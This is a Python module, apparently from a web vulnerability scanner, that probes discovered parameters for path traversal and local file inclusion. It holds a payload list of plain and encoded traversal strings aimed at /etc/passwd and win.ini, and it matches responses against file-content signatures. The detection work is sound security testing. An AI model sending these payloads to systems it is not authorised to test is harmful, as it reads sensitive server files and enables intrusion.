"""Path traversal / Local File Inclusion detection (read-only probes)."""
from __future__ import annotations

import re

from modules.base import BaseModule, ScanContext, register
from core.result import Finding, Severity
from core.injection_points import discover_points, send, attack_url

PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\Windows\\win.ini",
]

# Signatures proving a real file was read.
UNIX_PASSWD = re.compile(r"root:.*?:0:0:", re.MULTILINE)
WIN_INI = re.compile(r"\[(extensions|fonts|mci extensions)\]", re.IGNORECASE)


@register
class PathTraversal(BaseModule):
    id = "path_traversal"
    name = "Path Traversal / LFI"
    category = "Injection"
    description = "Injects file-traversal payloads and detects /etc/passwd or win.ini content in the response."

    def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        points = discover_points(ctx)
        if not points:
            ctx.log("    no injectable points found")
            return findings
        ctx.log(f"    testing {len(points)} point(s)")

        for pt in points:
            if ctx.should_stop():
                break
            for payload in PAYLOADS:
                if ctx.should_stop():
                    break
                r = send(ctx, pt, payload)
                if r is None:
                    continue
                body = r.text or ""
                m = UNIX_PASSWD.search(body) or WIN_INI.search(body)
                if m:
                    findings.append(Finding(
                        module_id=self.id,
                        title=f"Path traversal / LFI in {pt.label()}",
                        severity=Severity.HIGH,
                        url=pt.base_url,
                        confidence="Confirmed",
                        description="A traversal payload returned local file contents, indicating LFI.",
                        evidence=f"Payload: {payload}\nSignature matched: {m.group(0)[:80]!r}",
                        request=f"{pt.method} {pt.base_url}  ({pt.param}=<payload>)",
                        remediation="Never build file paths from user input; use allow-lists / canonicalize & confine.",
                        extra={"chain": {"type": "lfi", "method": pt.method, "base_url": pt.base_url,
                                         "param": pt.param, "base_params": pt.base_params, "where": pt.where},
                               "attack": {"method": pt.method, "url": attack_url(pt, payload)}},
                    ))
                    break
        return findings
